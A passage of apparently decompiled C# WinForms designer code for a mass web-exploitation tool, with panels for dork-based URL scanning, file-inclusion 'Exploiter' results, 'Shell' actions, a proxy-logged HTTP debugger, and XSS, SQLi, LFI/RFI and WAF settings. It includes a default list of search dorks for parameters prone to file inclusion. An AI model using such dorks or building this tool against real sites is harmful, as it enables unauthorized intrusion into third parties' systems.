		this.lblSkipWordURL.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblLFIPathCount.Location = new System.Drawing.Point(74, 11);
		this.lblLFIPathCount.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblLFIPathCount.Name = "lblLFIPathCount";
		this.lblLFIPathCount.Size = new System.Drawing.Size(308, 26);
		this.lblLFIPathCount.TabIndex = 1;
		this.lblLFIPathCount.Text = "Path Traversal Count";
		this.lblLFIPathCount.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.bcWorker.WorkerReportsProgress = true;
		this.bcWorker.WorkerSupportsCancellation = true;
		this.pnlNotepad.AutoScroll = true;
		this.pnlNotepad.Controls.Add(this.txtNotepad);
		this.pnlNotepad.Location = new System.Drawing.Point(2428, 698);
		this.pnlNotepad.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlNotepad.Name = "pnlNotepad";
		this.pnlNotepad.Size = new System.Drawing.Size(178, 60);
		this.pnlNotepad.TabIndex = 29;
		this.pnlNotepad.Visible = false;
		this.txtNotepad.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtNotepad.Font = new System.Drawing.Font("Courier New", 10.125f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtNotepad.Location = new System.Drawing.Point(0, 0);
		this.txtNotepad.Margin = new System.Windows.Forms.Padding(2);
		this.txtNotepad.MaxLength = 999999999;
		this.txtNotepad.Multiline = true;
		this.txtNotepad.Name = "txtNotepad";
		this.txtNotepad.ScrollBars = System.Windows.Forms.ScrollBars.Both;
		this.txtNotepad.Size = new System.Drawing.Size(178, 60);
		this.txtNotepad.TabIndex = 1;
		this.txtNotepad.WordWrap = false;
		this.mnuAbout.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuAbout.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.mnuAboutClipboard, this.mnuAboutHWID });
		this.mnuAbout.Name = "mnuChecked";
		this.mnuAbout.ShowImageMargin = false;
		this.mnuAbout.ShowItemToolTips = false;
		this.mnuAbout.Size = new System.Drawing.Size(234, 64);
		this.mnuAboutClipboard.Name = "mnuAboutClipboard";
		this.mnuAboutClipboard.Size = new System.Drawing.Size(233, 30);
		this.mnuAboutClipboard.Text = "Clipboard my Contact";
		this.mnuAboutHWID.Name = "mnuAboutHWID";
		this.mnuAboutHWID.Size = new System.Drawing.Size(233, 30);
		this.mnuAboutHWID.Text = "Clipboard HWID";
		this.pnlScanner.AutoScroll = true;
		this.pnlScanner.Controls.Add(this.grbScannerURL);
		this.pnlScanner.Controls.Add(this.grbDorks);
		this.pnlScanner.Location = new System.Drawing.Point(274, 12);
		this.pnlScanner.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlScanner.Name = "pnlScanner";
		this.pnlScanner.Size = new System.Drawing.Size(712, 388);
		this.pnlScanner.TabIndex = 30;
		this.pnlScanner.Visible = false;
		this.grbScannerURL.Controls.Add(this.dtgQueue);
		this.grbScannerURL.Controls.Add(this.tsSearchFilter);
		this.grbScannerURL.Dock = System.Windows.Forms.DockStyle.Fill;
		this.grbScannerURL.Location = new System.Drawing.Point(0, 286);
		this.grbScannerURL.Name = "grbScannerURL";
		this.grbScannerURL.Size = new System.Drawing.Size(712, 102);
		this.grbScannerURL.TabIndex = 1;
		this.grbScannerURL.TabStop = false;
		this.grbScannerURL.Text = "A.\r\u0013";
		this.dtgQueue.AllowDrop = true;
		this.dtgQueue.AllowUserToAddRows = false;
		this.dtgQueue.AllowUserToDeleteRows = false;
		this.dtgQueue.AllowUserToResizeColumns = false;
		this.dtgQueue.AllowUserToResizeRows = false;
		this.dtgQueue.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgQueue.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgQueue.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgQueue.ColumnHeadersVisible = false;
		this.dtgQueue.Columns.AddRange(this.Column1);
		this.dtgQueue.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgQueue.Location = new System.Drawing.Point(3, 57);
		this.dtgQueue.Name = "dtgQueue";
		this.dtgQueue.ReadOnly = true;
		this.dtgQueue.RowHeadersVisible = false;
		this.dtgQueue.RowHeadersWidth = 60;
		this.dtgQueue.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.dtgQueue.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgQueue.ShowCellErrors = false;
		this.dtgQueue.ShowCellToolTips = false;
		this.dtgQueue.ShowEditingIcon = false;
		this.dtgQueue.ShowRowErrors = false;
		this.dtgQueue.Size = new System.Drawing.Size(706, 42);
		this.dtgQueue.TabIndex = 37;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "URL";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.tsSearchFilter.AutoSize = false;
		this.tsSearchFilter.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSearchFilter.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSearchFilter.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.txtSearchFilter, this.btnSearchFilter, this.ToolStripSeparator9, this.chkHideDork });
		this.tsSearchFilter.Location = new System.Drawing.Point(3, 22);
		this.tsSearchFilter.Name = "tsSearchFilter";
		this.tsSearchFilter.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsSearchFilter.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsSearchFilter.ShowItemToolTips = false;
		this.tsSearchFilter.Size = new System.Drawing.Size(706, 35);
		this.tsSearchFilter.TabIndex = 5;
		this.tsSearchFilter.Text = "ToolStrip2";
		this.txtSearchFilter.Enabled = false;
		this.txtSearchFilter.Name = "txtSearchFilter";
		this.txtSearchFilter.Size = new System.Drawing.Size(300, 35);
		this.txtSearchFilter.Text = "Action.action;";
		this.btnSearchFilter.CheckOnClick = true;
		this.btnSearchFilter.Image = ns0.Class6.SearchContract_16x_24;
		this.btnSearchFilter.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnSearchFilter.Name = "btnSearchFilter";
		this.btnSearchFilter.Size = new System.Drawing.Size(176, 32);
		this.btnSearchFilter.Text = "Filter by keyword";
		this.ToolStripSeparator9.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.ToolStripSeparator9.Name = "ToolStripSeparator9";
		this.ToolStripSeparator9.Size = new System.Drawing.Size(6, 35);
		this.chkHideDork.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.chkHideDork.CheckOnClick = true;
		this.chkHideDork.Image = ns0.Class6.AutoArrangeShapes_16x_24;
		this.chkHideDork.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.chkHideDork.Name = "chkHideDork";
		this.chkHideDork.Size = new System.Drawing.Size(129, 32);
		this.chkHideDork.Text = "Hide Dorks";
		this.grbDorks.Controls.Add(this.lblSearchSummary_1);
		this.grbDorks.Controls.Add(this.lblSearchSummary_2);
		this.grbDorks.Controls.Add(this.txtMultiDorks);
		this.grbDorks.Controls.Add(this.lstSearchEngine);
		this.grbDorks.Dock = System.Windows.Forms.DockStyle.Top;
		this.grbDorks.Location = new System.Drawing.Point(0, 0);
		this.grbDorks.Name = "grbDorks";
		this.grbDorks.Size = new System.Drawing.Size(712, 286);
		this.grbDorks.TabIndex = 0;
		this.grbDorks.TabStop = false;
		this.grbDorks.Text = "Dorks";
		this.lblSearchSummary_1.BackColor = System.Drawing.SystemColors.Window;
		this.lblSearchSummary_1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lblSearchSummary_1.Font = new System.Drawing.Font("Courier New", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.lblSearchSummary_1.Location = new System.Drawing.Point(165, 22);
		this.lblSearchSummary_1.Name = "lblSearchSummary_1";
		this.lblSearchSummary_1.Size = new System.Drawing.Size(290, 261);
		this.lblSearchSummary_1.TabIndex = 70;
		this.lblSearchSummary_1.Visible = false;
		this.lblSearchSummary_2.BackColor = System.Drawing.SystemColors.Window;
		this.lblSearchSummary_2.Dock = System.Windows.Forms.DockStyle.Right;
		this.lblSearchSummary_2.Font = new System.Drawing.Font("Courier New", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.lblSearchSummary_2.Location = new System.Drawing.Point(455, 22);
		this.lblSearchSummary_2.Name = "lblSearchSummary_2";
		this.lblSearchSummary_2.Size = new System.Drawing.Size(254, 261);
		this.lblSearchSummary_2.TabIndex = 69;
		this.lblSearchSummary_2.Visible = false;
		this.txtMultiDorks.Dock = System.Windows.Forms.DockStyle.Fill;
		this.txtMultiDorks.Location = new System.Drawing.Point(165, 22);
		this.txtMultiDorks.MaxLength = 999999999;
		this.txtMultiDorks.Multiline = true;
		this.txtMultiDorks.Name = "txtMultiDorks";
		this.txtMultiDorks.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtMultiDorks.Size = new System.Drawing.Size(544, 261);
		this.txtMultiDorks.TabIndex = 60;
		this.txtMultiDorks.Text = "?item_id=\r\n?productID=\r\narticle ?id=\r\ndetail ?id=\r\nnewscat ?id=\r\n?page=\r\n?pageID=\r\n?cat_id=\r\n?filename=\r\n?loadfile=\r\n?section=\r\n?url=\r\n?site=\r\n?path=\r\n?include_file=\r\n?current_frame=\r\n?openfile=";
		this.txtMultiDorks.WordWrap = false;
		this.lstSearchEngine.CheckOnClick = true;
		this.lstSearchEngine.Dock = System.Windows.Forms.DockStyle.Left;
		this.lstSearchEngine.FormattingEnabled = true;
		this.lstSearchEngine.IntegralHeight = false;
		this.lstSearchEngine.Location = new System.Drawing.Point(3, 22);
		this.lstSearchEngine.Name = "lstSearchEngine";
		this.lstSearchEngine.Size = new System.Drawing.Size(162, 261);
		this.lstSearchEngine.TabIndex = 67;
		this.lstSearchEngine.ThreeDCheckBoxes = true;
		this.lstSearchEngine.UseCompatibleTextRendering = true;
		this.lstSearchEngine.UseTabStops = false;
		this.mnuQueue.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuQueue.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.mnuQueueShell, this.mnuQueueClipboard, this.mnuQueueSP3, this.mnuQueueSelectAll, this.mnuQueueSP1, this.mnuQueueAddURLs, this.mnuQueueSP2, this.mnuQueueTrash, this.mnuQueueRomove });
		this.mnuQueue.Name = "mnuChecked";
		this.mnuQueue.ShowImageMargin = false;
		this.mnuQueue.ShowItemToolTips = false;
		this.mnuQueue.Size = new System.Drawing.Size(172, 202);
		this.mnuQueueShell.Name = "mnuQueueShell";
		this.mnuQueueShell.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueShell.Text = "Shell";
		this.mnuQueueClipboard.Name = "mnuQueueClipboard";
		this.mnuQueueClipboard.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueClipboard.Text = "Clipboard";
		this.mnuQueueSP3.Name = "mnuQueueSP3";
		this.mnuQueueSP3.Size = new System.Drawing.Size(168, 6);
		this.mnuQueueSelectAll.Name = "mnuQueueSelectAll";
		this.mnuQueueSelectAll.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueSelectAll.Text = "Select All";
		this.mnuQueueSP1.Name = "mnuQueueSP1";
		this.mnuQueueSP1.Size = new System.Drawing.Size(168, 6);
		this.mnuQueueAddURLs.Name = "mnuQueueAddURLs";
		this.mnuQueueAddURLs.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueAddURLs.Text = "Add URL's";
		this.mnuQueueSP2.Name = "mnuQueueSP2";
		this.mnuQueueSP2.Size = new System.Drawing.Size(168, 6);
		this.mnuQueueTrash.Name = "mnuQueueTrash";
		this.mnuQueueTrash.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueTrash.Text = "Move to Trash";
		this.mnuQueueRomove.Name = "mnuQueueRomove";
		this.mnuQueueRomove.Size = new System.Drawing.Size(171, 30);
		this.mnuQueueRomove.Text = "Remove";
		this.pnlExploiter.AutoScroll = true;
		this.pnlExploiter.Controls.Add(this.dtgFileInclusao);
		this.pnlExploiter.Controls.Add(this.tsFileInclusao);
		this.pnlExploiter.Location = new System.Drawing.Point(271, 516);
		this.pnlExploiter.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlExploiter.Name = "pnlExploiter";
		this.pnlExploiter.Size = new System.Drawing.Size(610, 132);
		this.pnlExploiter.TabIndex = 31;
		this.pnlExploiter.Visible = false;
		this.dtgFileInclusao.AllowUserToAddRows = false;
		this.dtgFileInclusao.AllowUserToDeleteRows = false;
		this.dtgFileInclusao.AllowUserToOrderColumns = true;
		this.dtgFileInclusao.AllowUserToResizeRows = false;
		this.dtgFileInclusao.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgFileInclusao.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgFileInclusao.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgFileInclusao.Columns.AddRange(this.DataGridViewImageColumn1, this.DataGridViewTextBoxColumn2, this.DataGridViewTextBoxColumn3, this.DataGridViewTextBoxColumn6, this.DataGridViewTextBoxColumn8, this.Column18);
		this.dtgFileInclusao.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgFileInclusao.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnF2;
		this.dtgFileInclusao.Location = new System.Drawing.Point(0, 33);
		this.dtgFileInclusao.Name = "dtgFileInclusao";
		this.dtgFileInclusao.RowHeadersVisible = false;
		this.dtgFileInclusao.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgFileInclusao.ShowCellErrors = false;
		this.dtgFileInclusao.ShowEditingIcon = false;
		this.dtgFileInclusao.ShowRowErrors = false;
		this.dtgFileInclusao.Size = new System.Drawing.Size(610, 99);
		this.dtgFileInclusao.TabIndex = 39;
		this.DataGridViewImageColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCellsExceptHeader;
		this.DataGridViewImageColumn1.HeaderText = "";
		this.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1";
		this.DataGridViewImageColumn1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridViewImageColumn1.Width = 5;
		this.DataGridViewTextBoxColumn2.HeaderText = "URL";
		this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
		this.DataGridViewTextBoxColumn2.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn2.Width = 400;
		this.DataGridViewTextBoxColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn3.HeaderText = "Type";
		this.DataGridViewTextBoxColumn3.Name = "DataGridViewTextBoxColumn3";
		this.DataGridViewTextBoxColumn3.ReadOnly = true;
		this.DataGridViewTextBoxColumn3.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn3.Width = 79;
		this.DataGridViewTextBoxColumn6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn6.HeaderText = "Country";
		this.DataGridViewTextBoxColumn6.Name = "DataGridViewTextBoxColumn6";
		this.DataGridViewTextBoxColumn6.ReadOnly = true;
		this.DataGridViewTextBoxColumn6.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn8.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn8.FillWeight = 120f;
		this.DataGridViewTextBoxColumn8.HeaderText = "Checked";
		this.DataGridViewTextBoxColumn8.Name = "DataGridViewTextBoxColumn8";
		this.DataGridViewTextBoxColumn8.ReadOnly = true;
		this.DataGridViewTextBoxColumn8.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn8.Width = 108;
		this.Column18.HeaderText = "Comments";
		this.Column18.Name = "Column18";
		this.tsFileInclusao.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsFileInclusao.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsFileInclusao.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.cmbFileInclusaoFilter, this.cmbFileInclusaoSearch, this.btnFileInclusaoSearchClear, this.txtFileInclusaoSearch, this.btnFileInclusaoSearch, this.lblSQLiNoInjectCount, this.lblFileInclusao });
		this.tsFileInclusao.Location = new System.Drawing.Point(0, 0);
		this.tsFileInclusao.Name = "tsFileInclusao";
		this.tsFileInclusao.Padding = new System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsFileInclusao.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.tsFileInclusao.Size = new System.Drawing.Size(610, 33);
		this.tsFileInclusao.TabIndex = 3;
		this.tsFileInclusao.Text = "ToolStrip2";
		this.cmbFileInclusaoFilter.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbFileInclusaoFilter.Name = "cmbFileInclusaoFilter";
		this.cmbFileInclusaoFilter.Size = new System.Drawing.Size(110, 33);
		this.cmbFileInclusaoSearch.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbFileInclusaoSearch.Name = "cmbFileInclusaoSearch";
		this.cmbFileInclusaoSearch.Size = new System.Drawing.Size(160, 33);
		this.btnFileInclusaoSearchClear.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.btnFileInclusaoSearchClear.Image = ns0.Class6.delete;
		this.btnFileInclusaoSearchClear.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnFileInclusaoSearchClear.Name = "btnFileInclusaoSearchClear";
		this.btnFileInclusaoSearchClear.Size = new System.Drawing.Size(28, 30);
		this.btnFileInclusaoSearchClear.Text = "Clear";
		this.txtFileInclusaoSearch.Name = "txtFileInclusaoSearch";
		this.txtFileInclusaoSearch.Size = new System.Drawing.Size(148, 33);
		this.btnFileInclusaoSearch.Image = ns0.Class6.SearchContract_16x_24;
		this.btnFileInclusaoSearch.ImageTransparentColor = System.Drawing.Color.Magenta;
		this.btnFileInclusaoSearch.Name = "btnFileInclusaoSearch";
		this.btnFileInclusaoSearch.Size = new System.Drawing.Size(92, 30);
		this.btnFileInclusaoSearch.Text = "Search";
		this.lblSQLiNoInjectCount.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.lblSQLiNoInjectCount.Name = "lblSQLiNoInjectCount";
		this.lblSQLiNoInjectCount.Size = new System.Drawing.Size(6, 33);
		this.lblFileInclusao.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
		this.lblFileInclusao.Name = "lblFileInclusao";
		this.lblFileInclusao.Size = new System.Drawing.Size(122, 25);
		this.lblFileInclusao.Text = "lblFileInclusao";
		this.pnlTrash.AutoScroll = true;
		this.pnlTrash.Controls.Add(this.dtgTrash);
		this.pnlTrash.Location = new System.Drawing.Point(2405, 383);
		this.pnlTrash.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlTrash.Name = "pnlTrash";
		this.pnlTrash.Size = new System.Drawing.Size(136, 125);
		this.pnlTrash.TabIndex = 32;
		this.pnlTrash.Visible = false;
		this.dtgTrash.AllowDrop = true;
		this.dtgTrash.AllowUserToAddRows = false;
		this.dtgTrash.AllowUserToDeleteRows = false;
		this.dtgTrash.AllowUserToResizeColumns = false;
		this.dtgTrash.AllowUserToResizeRows = false;
		this.dtgTrash.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgTrash.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgTrash.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgTrash.ColumnHeadersVisible = false;
		this.dtgTrash.Columns.AddRange(this.DataGridViewTextBoxColumn1);
		this.dtgTrash.ContextMenuStrip = this.mnuTrash;
		this.dtgTrash.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgTrash.Location = new System.Drawing.Point(0, 0);
		this.dtgTrash.Name = "dtgTrash";
		this.dtgTrash.RowHeadersVisible = false;
		this.dtgTrash.RowHeadersWidth = 60;
		this.dtgTrash.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.dtgTrash.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgTrash.ShowCellErrors = false;
		this.dtgTrash.ShowCellToolTips = false;
		this.dtgTrash.ShowEditingIcon = false;
		this.dtgTrash.ShowRowErrors = false;
		this.dtgTrash.Size = new System.Drawing.Size(136, 125);
		this.dtgTrash.TabIndex = 38;
		this.DataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn1.HeaderText = "URL";
		this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
		this.DataGridViewTextBoxColumn1.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridViewTextBoxColumn1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.mnuTrash.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuTrash.Items.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.mnuTrashRefresh, this.ToolStripSeparator1, this.mnuTrashClippboard, this.mnuTrashSelectAll, this.ToolStripSeparator8, this.mnuTrashClearAll, this.ToolStripSeparator10, this.mnuTrashRemove, this.ToolStripSeparator11, this.mnuTrashCount });
		this.mnuTrash.Name = "mnuChecked";
		this.mnuTrash.ShowImageMargin = false;
		this.mnuTrash.ShowItemToolTips = false;
		this.mnuTrash.Size = new System.Drawing.Size(159, 208);
		this.mnuTrashRefresh.Name = "mnuTrashRefresh";
		this.mnuTrashRefresh.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashRefresh.Text = "Load Last 2k";
		this.ToolStripSeparator1.Name = "ToolStripSeparator1";
		this.ToolStripSeparator1.Size = new System.Drawing.Size(155, 6);
		this.mnuTrashClippboard.Name = "mnuTrashClippboard";
		this.mnuTrashClippboard.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashClippboard.Text = "Clipboard";
		this.mnuTrashSelectAll.Name = "mnuTrashSelectAll";
		this.mnuTrashSelectAll.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashSelectAll.Text = "Select All";
		this.ToolStripSeparator8.Name = "ToolStripSeparator8";
		this.ToolStripSeparator8.Size = new System.Drawing.Size(155, 6);
		this.mnuTrashClearAll.Name = "mnuTrashClearAll";
		this.mnuTrashClearAll.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashClearAll.Text = "Clear All";
		this.ToolStripSeparator10.Name = "ToolStripSeparator10";
		this.ToolStripSeparator10.Size = new System.Drawing.Size(155, 6);
		this.mnuTrashRemove.Name = "mnuTrashRemove";
		this.mnuTrashRemove.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashRemove.Text = "Remove";
		this.ToolStripSeparator11.Name = "ToolStripSeparator11";
		this.ToolStripSeparator11.Size = new System.Drawing.Size(155, 6);
		this.mnuTrashCount.Enabled = false;
		this.mnuTrashCount.Name = "mnuTrashCount";
		this.mnuTrashCount.Size = new System.Drawing.Size(158, 30);
		this.mnuTrashCount.Text = "Total: URLs";
		this.pnlWindows.Location = new System.Drawing.Point(2220, 383);
		this.pnlWindows.Name = "pnlWindows";
		this.pnlWindows.Size = new System.Drawing.Size(84, 128);
		this.pnlWindows.TabIndex = 133;
		this.pnlControls.AutoScroll = true;
		this.pnlControls.AutoSize = true;
		this.pnlControls.Location = new System.Drawing.Point(2144, 383);
		this.pnlControls.Name = "pnlControls";
		this.pnlControls.Size = new System.Drawing.Size(70, 128);
		this.pnlControls.TabIndex = 112;
		this.grbHttpLog.Controls.Add(this.lvwHttpLog);
		this.grbHttpLog.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.grbHttpLog.Location = new System.Drawing.Point(0, 1011);
		this.grbHttpLog.Name = "grbHttpLog";
		this.grbHttpLog.Size = new System.Drawing.Size(2583, 78);
		this.grbHttpLog.TabIndex = 34;
		this.grbHttpLog.Text = "HTTP Debugger";
		this.lvwHttpLog.AllowUserToAddRows = false;
		this.lvwHttpLog.AllowUserToResizeColumns = false;
		this.lvwHttpLog.AllowUserToResizeRows = false;
		this.lvwHttpLog.BackgroundColor = System.Drawing.SystemColors.Window;
		this.lvwHttpLog.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.lvwHttpLog.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.lvwHttpLog.Columns.AddRange(this.DataGridViewTextBoxColumn_0, this.clURL, this.Column2, this.Column4, this.Column3, this.ProxyIP);
		this.lvwHttpLog.ContextMenuStrip = this.mnuHttpLog;
		this.lvwHttpLog.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lvwHttpLog.Location = new System.Drawing.Point(0, 0);
		this.lvwHttpLog.MultiSelect = false;
		this.lvwHttpLog.Name = "lvwHttpLog";
		this.lvwHttpLog.RowHeadersVisible = false;
		this.lvwHttpLog.ShowCellErrors = false;
		this.lvwHttpLog.ShowEditingIcon = false;
		this.lvwHttpLog.ShowRowErrors = false;
		this.lvwHttpLog.Size = new System.Drawing.Size(2583, 78);
		this.lvwHttpLog.TabIndex = 4;
		this.DataGridViewTextBoxColumn_0.HeaderText = "ID";
		this.DataGridViewTextBoxColumn_0.Name = "ID";
		this.DataGridViewTextBoxColumn_0.Visible = false;
		this.clURL.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.clURL.HeaderText = "URL";
		this.clURL.Name = "clURL";
		this.clURL.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column2.HeaderText = "Size";
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.Width = 76;
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column4.HeaderText = "Status";
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column4.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.Column4.Width = 92;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column3.HeaderText = "Elapsed";
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 103;
		this.ProxyIP.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.ProxyIP.HeaderText = "Proxy";
		this.ProxyIP.Name = "ProxyIP";
		this.ProxyIP.ReadOnly = true;
		this.ProxyIP.Width = 83;
		this.mnuHttpLog.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuHttpLog.Items.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.mnuHttpLogClear, this.mnuHttpLogShell, this.mnuHttpLogClipboard, this.ToolStripSeparator4, this.mnuHttpLogAutoScroll, this.mnuHttpLogDock });
		this.mnuHttpLog.Name = "mnuChecked";
		this.mnuHttpLog.ShowImageMargin = false;
		this.mnuHttpLog.ShowItemToolTips = false;
		this.mnuHttpLog.Size = new System.Drawing.Size(147, 160);
		this.mnuHttpLogClear.Name = "mnuHttpLogClear";
		this.mnuHttpLogClear.Size = new System.Drawing.Size(146, 30);
		this.mnuHttpLogClear.Text = "Clear";
		this.mnuHttpLogShell.Name = "mnuHttpLogShell";
		this.mnuHttpLogShell.Size = new System.Drawing.Size(146, 30);
		this.mnuHttpLogShell.Text = "Shell";
		this.mnuHttpLogClipboard.Name = "mnuHttpLogClipboard";
		this.mnuHttpLogClipboard.Size = new System.Drawing.Size(146, 30);
		this.mnuHttpLogClipboard.Text = "Clipboard";
		this.ToolStripSeparator4.Name = "ToolStripSeparator4";
		this.ToolStripSeparator4.Size = new System.Drawing.Size(143, 6);
		this.mnuHttpLogAutoScroll.CheckOnClick = true;
		this.mnuHttpLogAutoScroll.Name = "mnuHttpLogAutoScroll";
		this.mnuHttpLogAutoScroll.Size = new System.Drawing.Size(146, 30);
		this.mnuHttpLogAutoScroll.Text = "Auto Scroll";
		this.mnuHttpLogDock.Name = "mnuHttpLogDock";
		this.mnuHttpLogDock.Size = new System.Drawing.Size(146, 30);
		this.mnuHttpLogDock.Text = "UnDock";
		this.VisualStyler1.HookVisualStyles = true;
		this.VisualStyler1.HostForm = this;
		this.VisualStyler1.License = (VisualStylerLicense)resources.GetObject("VisualStyler1.License");
		this.VisualStyler1.UseSystemFonts = true;
		this.VisualStyler1.LoadVisualStyle("");
		this.pnlSettingsAdvanced.AutoScroll = true;
		this.pnlSettingsAdvanced.Controls.Add(this.grbXSS);
		this.pnlSettingsAdvanced.Controls.Add(this.grbLfiLinux);
		this.pnlSettingsAdvanced.Controls.Add(this.grbSQLi);
		this.pnlSettingsAdvanced.Controls.Add(this.grbHTTPExploit);
		this.pnlSettingsAdvanced.Controls.Add(this.grbFileIncWAFs);
		this.pnlSettingsAdvanced.Controls.Add(this.lblAdvanced);
		this.pnlSettingsAdvanced.Controls.Add(this.grbRFI);
